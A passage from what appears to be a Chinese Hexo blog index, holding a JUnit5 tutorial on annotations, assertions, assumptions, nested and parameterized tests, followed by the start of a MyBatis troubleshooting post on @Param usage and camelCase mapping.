标注测试方法，测试完成后自动回滚</li></ul><h1 id="JUnit5常用注解"><a href="#JUnit5常用注解" class="headerlink" title="JUnit5常用注解"></a>JUnit5常用注解</h1><p>JUnit5的注解与JUnit4的注解有所变化</p><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-annotations">https://junit.org/junit5/docs/current/user-guide/#writing-tests-annotations</a></p><ul><li>**@Test :**表示方法是测试方法。但是与JUnit4的@Test不同，他的职责非常单一不能声明任何属性，拓展的测试将会由Jupiter提供额外测试</li><li>**@ParameterizedTest :**表示方法是参数化测试，下方会有详细介绍</li><li>**@RepeatedTest :**表示方法可重复执行，下方会有详细介绍</li><li>**@DisplayName :**为测试类或者测试方法设置展示名称</li><li>**@BeforeEach :**表示在每个单元测试之前执行</li><li>**@AfterEach :**表示在每个单元测试之后执行</li><li>**@BeforeAll :**表示在所有单元测试之前执行</li><li>**@AfterAll :**表示在所有单元测试之后执行</li><li>**@Tag :**表示单元测试类别，类似于JUnit4中的@Categories</li><li>**@Disabled :**表示测试类或测试方法不执行，类似于JUnit4中的@Ignore</li><li>**@Timeout :**表示测试方法运行如果超过了指定时间将会返回错误</li><li>**@ExtendWith :**为测试类或测试方法提供扩展类引用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test; <span class="comment">//注意这里使用的是jupiter的Test注解！！</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;Junit5功能测试类&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDemo</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserService userService;<span class="comment">//@SpringBootTest</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------常用注解测试</span></span><br><span class="line">    <span class="meta">@DisplayName(&quot;测试DisplayName注解&quot;)</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testDisplayName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Disabled</span></span><br><span class="line">    <span class="meta">@DisplayName(&quot;测试Disabled注解&quot;)</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RepeatedTest(value = 5)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testRepeatedTest</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userService.getUser());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Timeout(value = 500, unit = TimeUnit.MILLISECONDS)</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testTimeout</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        Thread.sleep(<span class="number">600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@BeforeEach</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testBeforeEach</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;测试就要开始了。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterEach</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testAfterEach</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;测试已经结束了。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@BeforeAll</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testBeforeAll</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;所有测试就要开始了。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterAll</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testAfterALL</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;所有测试已经结束了。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="断言（assertions）"><a href="#断言（assertions）" class="headerlink" title="断言（assertions）"></a>断言（assertions）</h1><p>断言（assertions）是测试方法中的核心部分，用来对测试需要满足的条件进行验证：</p><ul><li><p><strong>检查业务逻辑返回的数据是否合理。</strong></p></li><li><p><strong>所有的测试运行结束以后，会有一个详细的测试报告。</strong></p></li></ul><blockquote><p><strong>这些断言方法都是 org.junit.jupiter.api.Assertions 的静态方法</strong>。</p></blockquote><p>JUnit 5 内置的断言可以分成如下几个类别（<strong>前面断言失败，后面的代码都不会执行</strong>）：</p><h2 id="简单断言"><a href="#简单断言" class="headerlink" title="简单断言"></a>简单断言</h2><p>用来对单个值进行简单的验证。如：</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>assertEquals</td><td>判断两个对象或两个原始类型是否相等</td></tr><tr><td>assertNotEquals</td><td>判断两个对象或两个原始类型是否不相等</td></tr><tr><td>assertSame</td><td>判断两个对象引用是否指向同一个对象</td></tr><tr><td>assertNotSame</td><td>判断两个对象引用是否指向不同的对象</td></tr><tr><td>assertTrue</td><td>判断给定的布尔值是否为 true</td></tr><tr><td>assertFalse</td><td>判断给定的布尔值是否为 false</td></tr><tr><td>assertNull</td><td>判断给定的对象引用是否为 null</td></tr><tr><td>assertNotNull</td><td>判断给定的对象引用是否不为 null</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DisplayName(&quot;测试简单断言&quot;)</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testSimpleAssertion</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//断言成功没有返回任何信息。message是自定义断言失败后的提示信息。</span></span><br><span class="line">    assertEquals(<span class="number">3</span>, <span class="number">1</span> + <span class="number">2</span>, <span class="string">&quot;业务逻辑计算失败&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    assertSame(object1, object2, <span class="string">&quot;两个对象的引用不一样&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assertFalse(<span class="number">1</span> &gt; <span class="number">2</span>);</span><br><span class="line">    assertTrue(<span class="number">1</span> &lt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    assertNull(<span class="literal">null</span>);</span><br><span class="line">    assertNotNull(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组断言"><a href="#数组断言" class="headerlink" title="数组断言"></a>数组断言</h2><p>通过 assertArrayEquals 方法来判断两个对象或原始类型的数组是否相等：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;测试数组断言&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testArrayAssertion</span><span class="params">()</span> &#123;</span><br><span class="line">    assertArrayEquals(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">2</span>, <span class="number">2</span>&#125;, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>&#125;, <span class="string">&quot;数组内容不相等&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="组合断言"><a href="#组合断言" class="headerlink" title="组合断言"></a>组合断言</h2><p>assertAll 方法接受多个 org.junit.jupiter.api.Executable<strong>函数式接口的实例</strong>作为要验证的断言，可以通过 lambda 表达式很容易的提供这些断言</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;测试组合断言&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAllAssertions</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//全部断言需要成功才成功</span></span><br><span class="line">    assertAll(<span class="string">&quot;Math&quot;</span>,</span><br><span class="line">            () -&gt; assertEquals(<span class="number">2</span>, <span class="number">1</span> + <span class="number">1</span>),</span><br><span class="line">            () -&gt; assertTrue(<span class="number">0</span> &gt; <span class="number">0</span>)</span><br><span class="line">    );</span><br><span class="line">    System.out.println(<span class="string">&quot;======&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异常断言"><a href="#异常断言" class="headerlink" title="异常断言"></a>异常断言</h2><p>在JUnit4时期，想要测试方法的异常情况时，需要用**@Rule<strong>注解的ExpectedException变量还是比较麻烦的。而JUnit5提供了一种新的断言方式</strong>Assertions.assertThrows()**，配合函数式编程就可以进行使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;测试异常断言&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testExceptionAssertions</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//断定业务逻辑一定出现异常</span></span><br><span class="line">    <span class="type">ArithmeticException</span> <span class="variable">exception</span> <span class="operator">=</span> Assertions.assertThrows(</span><br><span class="line">            <span class="comment">//扔出断言异常</span></span><br><span class="line">            ArithmeticException.class, () -&gt; System.out.println(<span class="number">1</span> % <span class="number">1</span>), <span class="string">&quot;业务逻辑居然正常运行&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="超时断言"><a href="#超时断言" class="headerlink" title="超时断言"></a>超时断言</h2><p>Junit5还提供了<strong>Assertions.assertTimeout()</strong> 为测试方法设置了超时时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;测试超时断言&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testTimeoutAssertions</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//如果测试方法时间超过1s将会异常</span></span><br><span class="line">    assertTimeout(Duration.ofMillis(<span class="number">1000</span>), () -&gt; Thread.sleep(<span class="number">1200</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速失败"><a href="#快速失败" class="headerlink" title="快速失败"></a>快速失败</h2><p>通过 fail 方法直接使得测试失败</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;测试快速失败&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testShouldFail</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> == <span class="number">2</span>) &#123;</span><br><span class="line">        fail(<span class="string">&quot;测试失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="前置条件（assumptions）"><a href="#前置条件（assumptions）" class="headerlink" title="前置条件（assumptions）"></a>前置条件（assumptions）</h1><p>JUnit 5 中的前置条件（<strong>assumptions【假设】</strong>）类似于断言，不同之处在于<strong>不满足的断言会使得测试方法失败</strong>，而<strong>不满足的前置条件只会使得测试方法的执行终止</strong>。前置条件可以看成是测试方法执行的前提，当该前提不满足时，就没有继续执行的必要。类似于@Disabled。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DisplayName(&quot;前置条件&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AssumptionsTest</span> &#123;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">environment</span> <span class="operator">=</span> <span class="string">&quot;DEV&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="meta">@Test</span></span><br><span class="line"> <span class="meta">@DisplayName(&quot;simple&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleAssume</span><span class="params">()</span> &#123;</span><br><span class="line">    assumeTrue(Objects.equals(<span class="built_in">this</span>.environment, <span class="string">&quot;DEV&quot;</span>));</span><br><span class="line">    assumeFalse(() -&gt; Objects.equals(<span class="built_in">this</span>.environment, <span class="string">&quot;PROD&quot;</span>));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="meta">@Test</span></span><br><span class="line"> <span class="meta">@DisplayName(&quot;assume then do&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">assumeThenDo</span><span class="params">()</span> &#123;</span><br><span class="line">    assumingThat(</span><br><span class="line">       Objects.equals(<span class="built_in">this</span>.environment, <span class="string">&quot;DEV&quot;</span>),</span><br><span class="line">       () -&gt; System.out.println(<span class="string">&quot;In DEV&quot;</span>)</span><br><span class="line">    );</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>assumeTrue 和 assumFalse 确保给定的条件为 true 或 false，不满足条件会使得测试执行终止。assumingThat 的参数是表示条件的布尔值和对应的 Executable 接口的实现对象。只有条件满足时，Executable 对象才会被执行；当条件不满足时，测试执行并不会终止。</p><h1 id="嵌套测试"><a href="#嵌套测试" class="headerlink" title="嵌套测试"></a>嵌套测试</h1><p>JUnit 5 可以通过 Java 中的内部类和@Nested 注解实现嵌套测试，从而可以更好的把相关的测试方法组织在一起。在内部类中可以使用@BeforeEach 和@AfterEach 注解，而且嵌套的层次没有限制。</p><ul><li>嵌套测试情况下，外层的Test不能驱动内层的Before(After)Each&#x2F;All之类的方法提前&#x2F;之后运行</li><li>内层的Test能驱动外层的Before(After)Each&#x2F;All之类的方法提前&#x2F;之后运行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DisplayName(&quot;A stack&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestingAStackDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    Stack&lt;Object&gt; stack;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@DisplayName(&quot;is instantiated with new Stack()&quot;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">isInstantiatedWithNew</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nested</span></span><br><span class="line">    <span class="meta">@DisplayName(&quot;when new&quot;)</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">WhenNew</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@BeforeEach</span></span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">createNewStack</span><span class="params">()</span> &#123;</span><br><span class="line">            stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Test</span></span><br><span class="line">        <span class="meta">@DisplayName(&quot;is empty&quot;)</span></span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">            assertTrue(stack.isEmpty());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Test</span></span><br><span class="line">        <span class="meta">@DisplayName(&quot;throws EmptyStackException when popped&quot;)</span></span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">throwsExceptionWhenPopped</span><span class="params">()</span> &#123;</span><br><span class="line">            assertThrows(EmptyStackException.class, stack::pop);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Test</span></span><br><span class="line">        <span class="meta">@DisplayName(&quot;throws EmptyStackException when peeked&quot;)</span></span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">throwsExceptionWhenPeeked</span><span class="params">()</span> &#123;</span><br><span class="line">            assertThrows(EmptyStackException.class, stack::peek);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Nested</span></span><br><span class="line">        <span class="meta">@DisplayName(&quot;after pushing an element&quot;)</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">AfterPushing</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">anElement</span> <span class="operator">=</span> <span class="string">&quot;an element&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@BeforeEach</span></span><br><span class="line">            <span class="keyword">void</span> <span class="title function_">pushAnElement</span><span class="params">()</span> &#123;</span><br><span class="line">                stack.push(anElement);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Test</span></span><br><span class="line">            <span class="meta">@DisplayName(&quot;it is no longer empty&quot;)</span></span><br><span class="line">            <span class="keyword">void</span> <span class="title function_">isNotEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">                assertFalse(stack.isEmpty());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Test</span></span><br><span class="line">            <span class="meta">@DisplayName(&quot;returns the element when popped and is empty&quot;)</span></span><br><span class="line">            <span class="keyword">void</span> <span class="title function_">returnElementWhenPopped</span><span class="params">()</span> &#123;</span><br><span class="line">                assertEquals(anElement, stack.pop());</span><br><span class="line">                assertTrue(stack.isEmpty());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Test</span></span><br><span class="line">            <span class="meta">@DisplayName(&quot;returns the element when peeked but remains not empty&quot;)</span></span><br><span class="line">            <span class="keyword">void</span> <span class="title function_">returnElementWhenPeeked</span><span class="params">()</span> &#123;</span><br><span class="line">                assertEquals(anElement, stack.peek());</span><br><span class="line">                assertFalse(stack.isEmpty());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参数化测试"><a href="#参数化测试" class="headerlink" title="参数化测试"></a>参数化测试</h1><p>参数化测试是JUnit5很重要的一个新特性，它使得用不同的参数多次运行测试成为了可能，也为我们的单元测试带来许多便利。</p><p>利用**@ValueSource**等注解，指定入参，我们将可以使用不同的参数进行多次单元测试，而不需要每新增一个参数就新增一个单元测试，省去了很多冗余代码。</p><p><strong>@ValueSource</strong>: 为参数化测试指定入参来源，支持八大基础类以及String类型，Class类型</p><p><strong>@NullSource</strong>: 表示为参数化测试提供一个null的入参</p><p><strong>@EnumSource</strong>: 表示为参数化测试提供一个枚举入参</p><p><strong>@CsvFileSource</strong>：表示读取指定CSV文件内容作为参数化测试入参</p><p><strong>@MethodSource</strong>：表示读取指定方法的返回值作为参数化测试入参(注意方法返回需要是一个<strong>流</strong>)</p><blockquote><p>当然如果参数化测试仅仅只能做到指定普通的入参还达不到让我觉得惊艳的地步。让我真正感到他的强大之处的地方在于他可以支持外部的各类入参。如:CSV，YML，JSON 文件甚至方法的返回值也可以作为入参。只需要去实现<strong>ArgumentsProvider</strong>接口，任何外部文件都可以作为它的入参。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ParameterizedTest</span></span><br><span class="line"><span class="meta">@DisplayName(&quot;参数化测试&quot;)</span></span><br><span class="line"><span class="meta">@ValueSource(ints = &#123;1,2,3,4,5&#125;)</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testParameterized</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> Stream&lt;String&gt; <span class="title function_">stringProvider</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Stream.of(<span class="string">&quot;kobe&quot;</span>, <span class="string">&quot;james&quot;</span>,<span class="string">&quot;jordan&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@ParameterizedTest</span></span><br><span class="line"><span class="meta">@MethodSource(value = &#123;&quot;stringProvider&quot;&#125;)</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testParameterized2</span><span class="params">(String i)</span>&#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="迁移指南"><a href="#迁移指南" class="headerlink" title="迁移指南"></a>迁移指南</h1><p>在进行迁移的时候需要注意如下的变化：</p><ul><li>注解在 org.junit.jupiter.api 包中，断言在 org.junit.jupiter.api.Assertions 类中，前置条件在 org.junit.jupiter.api.Assumptions 类中。</li><li>把@Before 和@After 替换成@BeforeEach 和@AfterEach。</li><li>把@BeforeClass 和@AfterClass 替换成@BeforeAll 和@AfterAll。</li><li>把@Ignore 替换成@Disabled。</li><li>把@Category 替换成@Tag。</li><li>把@RunWith、@Rule 和@ClassRule 替换成@ExtendWith。</li></ul>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JUnit5 </tag>
            
            <tag> Jupiter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis问题解决</title>
      <link href="/posts/d428/"/>
      <url>/posts/d428/</url>
      
        <content type="html"><![CDATA[<h1 id="There-is-no-getter-for-property"><a href="#There-is-no-getter-for-property" class="headerlink" title="There is no getter for property"></a>There is no getter for property</h1><p>前两天工作中遇到这个异常，一开始还以为是实体类漏写set&#x2F;get方法，经排查不是。</p><p><strong>异常</strong>大概如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: There is no getter <span class="keyword">for</span> property named <span class="string">&#x27;user&#x27;</span> in <span class="string">&#x27;class top.nanzx.entity.User&#x27;</span></span><br></pre></td></tr></table></figure><p>dao层代码大概如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;SELECT * FROM users WHERE id = #&#123;user.id&#125;&quot;)</span></span><br><span class="line">User <span class="title function_">getUser</span><span class="params">(User user)</span></span><br></pre></td></tr></table></figure><p><strong>解决：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;SELECT * FROM users WHERE id = #&#123;user.id&#125;&quot;)</span></span><br><span class="line">User <span class="title function_">getUser</span><span class="params">(<span class="meta">@Param(&quot;user&quot;)</span>User user)</span></span><br></pre></td></tr></table></figure><p>当时有点迷惑平时写demo根本不用加**@Param注解**，回来测试后得出如下结论（id是参数user的一个属性）：</p><ul><li>如果SQL语句中使用<code>#&#123;user.id&#125;</code>时，参数必须加@Param注解</li><li>如果SQL语句中使用<code>#&#123;id&#125;</code>时，参数可以不加@Param注解</li><li>如果参数有多个，则参数需加@Param注解</li></ul><hr><h1 id="驼峰命名配置开启后没生效"><a href="#驼峰命名配置开启后没生效" class="headerlink" title="驼峰命名配置开启后没生效"></a>驼峰命名配置开启后没生效</h1><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启驼峰命名转换</span></span><br><span class="line"><span class="attr">mybatis.configuration.map-underscore-to-camel-case</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure><p><strong>异常：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; users = userService.getAllUsers();</span><br><span 